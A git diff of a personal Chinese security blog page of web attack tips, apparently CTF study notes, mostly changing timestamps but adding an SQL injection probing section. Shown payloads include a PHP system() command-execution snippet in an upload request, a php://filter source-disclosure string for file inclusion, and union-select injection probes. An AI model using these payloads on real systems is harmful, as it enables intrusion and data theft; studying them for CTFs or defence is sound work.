@@ -6,7 +6,7 @@
 
 <title>网络攻防tips | Hagemon&#39;s Log</title>
 
-<link rel="shortcut icon" href="https://hagemon.github.io/favicon.ico?v=1624628928516">
+<link rel="shortcut icon" href="https://hagemon.github.io/favicon.ico?v=1624708489132">
 
 <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://hagemon.github.io/styles/main.css">
@@ -77,7 +77,7 @@
             
         </div>
         <div style="text-align: center">
-            <form id="gridea-search-form" style="position: relative" data-update="1624628928516" action="/search/index.html">
+            <form id="gridea-search-form" style="position: relative" data-update="1624708489132" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
                 <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
             </form>
@@ -186,6 +186,7 @@ Content-Type: application/x-www-form-urlencoded
 
 &lt;?php system(&quot;ls&quot;); ?&gt;
 </code></pre>
+<h2 id="data协议">data协议</h2>
 <h1 id="文件包含">文件包含</h1>
 <p>文件包含会执行include的php文件，如果php文件里面同时输出你的输入，以及对某个文件进行包含，那么可以利用这点执行php代码，比如：</p>
 <pre><code class="language-php">&lt;?php
@@ -212,6 +213,16 @@ include($page);
 <p>URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞，可以通过php的filter协议来读取php源码的base64编码形式。</p>
 <pre><code>/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
 </code></pre>
+<h1 id="sql注入的尝试">Sql注入的尝试</h1>
+<p>以正常查询为<code>localhost:8888/index.php?id=1</code>的环境为例，可以做的尝试有：</p>
+<ul>
+<li>id=1 union select 1, 2 --+</li>
+<li>id=1' union select 1, 2 --+</li>
+<li>id=1&quot; union select 1, 2 --+</li>
+<li>id=1') union select 1, 2 --+</li>
+<li>id=1&quot;) union select 1,2 --+</li>
+</ul>
+<p>如果出现列数不对的报错提示，则可以进一步构造payload。</p>
 
                 </div>
             </article>
